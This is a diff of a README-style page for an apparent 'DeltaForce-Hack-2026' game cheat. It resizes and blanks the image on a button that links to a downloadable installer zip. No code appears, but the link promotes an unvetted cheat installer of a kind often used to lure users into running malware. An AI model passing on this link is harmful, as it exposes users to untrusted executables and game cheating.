@@ -8,9 +8,8 @@
 
 
 <a href="https://github.com/WantDeputyStage/DeltaForce-Hack-2026/releases/download/Latest/DeltaForce_Installer.zip">
-  <img width="1774" height="887" alt="Download" src="https://github.com/user-attachments/assets/fe6b983e-aa66-4a0f-8add-d4e6f00135de" />
+  <img width="160" alt="Download" src="" />
 </a>
-
 
 
 <img width="474" height="266" alt="image" src="https://github.com/user-attachments/assets/ff15341b-9927-4d50-b219-62f3b483017e" />
